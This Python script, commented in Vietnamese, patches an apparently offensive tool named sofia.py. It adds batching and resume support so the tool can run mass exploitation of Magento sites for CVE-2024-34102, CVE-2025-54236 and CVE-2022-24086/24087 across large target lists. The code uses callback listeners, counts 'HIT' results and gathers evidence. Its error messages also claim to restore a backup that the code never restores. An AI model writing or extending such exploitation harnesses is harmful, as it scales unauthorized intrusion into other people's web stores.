#!/usr/bin/env python3
"""SofiaTool v2 — nâng cấp idempotent sofia.py lên bản multi-target.

Bản multi-target bổ sung 2 cờ CLI:
  --batch-size N   xử lý target theo nhóm N (danh sách lớn, tokens bounded)
  --resume         bỏ qua target đã có kết quả trong report/report.json

Cách dùng:
  python3 tools/upgrade_multitarget.py [path/to/sofia.py]

An toàn:
  - Nếu sofia.py đã nâng cấp (marker SOFIA-MT) -> thoát ngay, làm gì cả.
  - Trước khi sửa: backup sofia.py.bak.<timestamp>.
  - Sau khi sửa: py_compile; lỗi -> khôi phục backup, thoát mã lỗi 1.
"""
import shutil
import sys
import time

MARKERS = ("# ---- multi-target: batch + resume (SOFIA-MT) ----",
           "def processed_urls():")

NEW_PHASE_EXPLOIT = r'''def processed_urls():
    """Đọc report.json -> set URL đã có kết quả (cho --resume).

    Một URL được coi là 'đã xử lý' khi entry targets[] có time hoặc error
    được ghi (hit lẫn miss đều tính) — chạy lại danh sách lớn sẽ không quét
    lại target đã xong ở lần trước.
    """
    done = set()
    for e in load_report().get("targets", []):
        url = (e or {}).get("url")
        if not url:
            continue
        if e.get("time") is not None or e.get("hit") is not None \
                or e.get("error") is not None:
            done.add(url.lower())
    return done


def _submit_cve_workers(pool, futs, t, listener):
    """Submit worker cho từng CVE áp dụng của 1 target (nhiều CVE -> nhiều worker)."""
    cves = t.get("cves") or version.ALL_CVES
    if "CVE-2024-34102" in cves:
        futs[pool.submit(run_target, t, listener)] = t
    if "CVE-2025-54236" in cves:
        futs[pool.submit(session_reaper.run_target, t)] = t
    if "CVE-2022-24086/24087" in cves:
        futs[pool.submit(cve_2022_24086.run_target, t)] = t
    if not cves:
        log.info("  skip %s (version %s: không CVE nào khớp)",
                 t["url"], t.get("version"))


def _collect_futures(pool, futs, results):
    """Gom kết quả các worker; 1 worker crash không làm chết cả batch."""
    for fut in as_completed(futs):
        t = futs[fut]
        try:
            r = fut.result()
            results.append(r)
            if r.get("hit"):
                log.info("*** HIT: %s [%s] -> %s", r["url"],
                         r.get("cve"), r.get("evidence_dir"))
        except Exception as e:  # bảo vệ pool, không để 1 target làm chết thread
            log.exception("[%s] worker crash", t["url"])
            results.append({"url": t["url"], "source": t.get("source"),
                            "cve": "CVE-2024-34102", "hit": False,
                            "error": f"worker: {e}"})


def phase_exploit(q, listener, args, resume_urls=None):
    """Chạy run_target theo batch — hỗ trợ multi-target quy mô lớn.

    - args.batch_size > 0: xử lý từng nhóm (tokens/state bounded, tiến độ
      rõ ràng, Ctrl-C giữa chừng chỉ mất batch hiện tại).
    - resume_urls (= processed_urls() khi --resume): bỏ target đã xong.
    Trả list kết quả (hit/miss) để PHA 5 tổng hợp.
    """
    targets = []
    while not q.empty():
        t = q.pop()
        if args.max_targets and len(targets) >= args.max_targets:
            break
        targets.append(t)

    if resume_urls:
        before = len(targets)
        targets = [t for t in targets if t["url"].lower() not in resume_urls]
        log.info("--resume: bỏ %d/%d target đã xử lý lần trước",
                 before - len(targets), before)
        if not targets:
            log.info("tất cả target đã xử lý trước đó — thoát")
            return []

    batch_size = args.batch_size if args.batch_size and args.batch_size > 0 \
        else len(targets) or 1
    n_batches = (len(targets) + batch_size - 1) // batch_size
    results = []
    for bi, start in enumerate(range(0, len(targets), batch_size), 1):
        batch = targets[start:start + batch_size]
        log.info("PHA 3/4: batch %d/%d — exploit %d target với %d luồng, "
                 "WAIT_CALLBACK=%ds",
                 bi, n_batches, len(batch), args.threads,
                 config.WAIT_CALLBACK)
        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            futs = {}
            for t in batch:
                _submit_cve_workers(pool, futs, t, listener)
            _collect_futures(pool, futs, results)
        new = results[len(results) - len(batch):]
        hits_in = sum(1 for r in new if r.get("hit"))
        total_hits = sum(1 for r in results if r.get("hit"))
        log.info("batch %d/%d xong: %d hit mới (tổng %d/%d cho tới nay)",
                 bi, n_batches, hits_in, total_hits, len(targets))
    return results
'''

OLD_PHASE_EXPLOIT = '''def phase_exploit(q, listener, args):
    """Chạy run_target trên pool. Trả list kết quả."""
    targets = []
    while not q.empty():
        t = q.pop()
        if args.max_targets and len(targets) >= args.max_targets:
            break
        targets.append(t)
    log.info("PHA 3/4: exploit %d target với %d luồng, WAIT_CALLBACK=%ds",
             len(targets), args.threads, config.WAIT_CALLBACK)
    results = []
    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futs = {}
        for t in targets:
            cves = t.get("cves") or version.ALL_CVES
            # một target có thể thuộc nhiều CVE -> submit nhiều worker
            if "CVE-2024-34102" in cves:
                futs[pool.submit(run_target, t, listener)] = t
            if "CVE-2025-54236" in cves:
                futs[pool.submit(session_reaper.run_target, t)] = t
            if "CVE-2022-24086/24087" in cves:
                futs[pool.submit(cve_2022_24086.run_target, t)] = t
            if not cves:
                log.info("  skip %s (version %s: không CVE nào khớp)",
                         t["url"], t.get("version"))
        for fut in as_completed(futs):
            t = futs[fut]
            try:
                r = fut.result()
                results.append(r)
                if r.get("hit"):
                    log.info("*** HIT: %s [%s] -> %s", r["url"],
                             r.get("cve"), r.get("evidence_dir"))
            except Exception as e:  # bảo vệ pool, không để 1 target làm chết thread
                log.exception("[%s] worker crash", t["url"])
                results.append({"url": t["url"], "source": t.get("source"),
                                "cve": "CVE-2024-34102", "hit": False,
                                "error": f"worker: {e}"})
    return results
'''

PARSER_ANCHOR = '''    p.add_argument("--tunnel-url", metavar="URL", default=None,
                   help="ghi đè tunnel URL (vd đã có sẵn) — bỏ qua tunnel manager")
    return p
'''

PARSER_ADD = '''    p.add_argument("--tunnel-url", metavar="URL", default=None,
                   help="ghi đè tunnel URL (vd đã có sẵn) — bỏ qua tunnel manager")
    # ---- multi-target: batch + resume (SOFIA-MT) ----
    p.add_argument("--batch-size", type=int, default=0, metavar="N",
                   help="số target xử lý mỗi batch (mặc định: 0 = tất cả; "
                        "dùng cho danh sách target lớn)")
    p.add_argument("--resume", action="store_true",
                   help="bỏ qua target đã có kết quả trong report/report.json "
                        "(tiếp tục lần chạy bị dừng — kết hợp --batch-size)")
    return p
'''

DOC_OLD = '''                     - CVE-2022-24086/24087 (2.3.3-p1-2.3.7-p2, 2.4.0-2.4.3-p1)
  PHA 5  report    : report.json / hits.csv / evidence / webhook + dọn dẹp
'''

DOC_NEW = '''                     - CVE-2022-24086/24087 (2.3.3-p1-2.3.7-p2, 2.4.0-2.4.3-p1)
                     Multi-target: --batch-size <N> chia nhỏ danh sách, --resume
                     bỏ qua target đã có kết quả (report/report.json).
  PHA 5  report    : report.json / hits.csv / evidence / webhook + dọn dẹp
'''

MAIN_OLD = '''        results = phase_exploit(q, listener, args)
        hits = phase_report(results)
'''

MAIN_NEW = '''        resume_urls = processed_urls() if args.resume else None
        results = phase_exploit(q, listener, args, resume_urls=resume_urls)
        hits = phase_report(results)
'''

PHA5_HEADER = "# ------------------------------------------------------------------ PHA 5"


def log(msg):
    print(f"[upgrade] {msg}")


def already_upgraded(text):
    return all(m in text for m in MARKERS)


def patch(text):
    """Áp 3 miếng vá. Ném ValueError nếu anchor không khớp (không sửa gì)."""
    # 1) parser
    if text.count(PARSER_ANCHOR) != 1:
        raise ValueError("anchor parser không khớp (count=%d)" % text.count(PARSER_ANCHOR))
    text = text.replace(PARSER_ANCHOR, PARSER_ADD, 1)

    # 2) phase_exploit -> bộ functions multi-target
    start = text.find("def phase_exploit(q, listener, args):")
    if start < 0:
        raise ValueError("không tìm thấy def phase_exploit")
    end = text.find(PHA5_HEADER, start)
    if end < 0:
        raise ValueError("không tìm thấy header PHA 5")
    text = text[:start] + NEW_PHASE_EXPLOIT + text[end:]

    # 2b) docstring: ghi chú multi-target
    if text.count(DOC_OLD) != 1:
        raise ValueError("anchor docstring không khớp (count=%d)" % text.count(DOC_OLD))
    text = text.replace(DOC_OLD, DOC_NEW, 1)

    # 3) main(): resume_urls + gọi phase_exploit với tham số mới
    if text.count(MAIN_OLD) != 1:
        raise ValueError("anchor main() không khớp (count=%d)" % text.count(MAIN_OLD))
    text = text.replace(MAIN_OLD, MAIN_NEW, 1)
    return text


def main():
    path = sys.argv[1] if len(sys.argv) > 1 else "sofia.py"
    with open(path, encoding="utf-8") as f:
        original = f.read()
    if already_upgraded(original):
        log(f"{path} đã ở bản multi-target — bỏ qua")
        return 0

    log(f"backup: {path}.bak.{int(time.time())}")
    shutil.copy2(path, f"{path}.bak.{int(time.time())}")

    try:
        new = patch(original)
    except ValueError as e:
        log(f"LỖI: {e} — khôi phục backup, không sửa file")
        return 1

    tmp = path + ".mt.new"
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(new)

    # verify trước khi ghi đè
    import py_compile
    try:
        py_compile.compile(tmp, doraise=True)
    except py_compile.PyCompileError as e:
        log(f"LỖI compile bản mới: {e} — khôi phục backup")
        return 1

    os_replace(tmp, path)
    if not already_upgraded(open(path, encoding="utf-8").read()):
        log("LỖI: marker vẫn thiếu sau khi ghi — khôi phục backup")
        return 1
    log(f"{path} đã nâng cấp lên bản multi-target (--batch-size, --resume)")
    return 0


def os_replace(src, dst):
    import os
    os.replace(src, dst)


if __name__ == "__main__":
    sys.exit(main())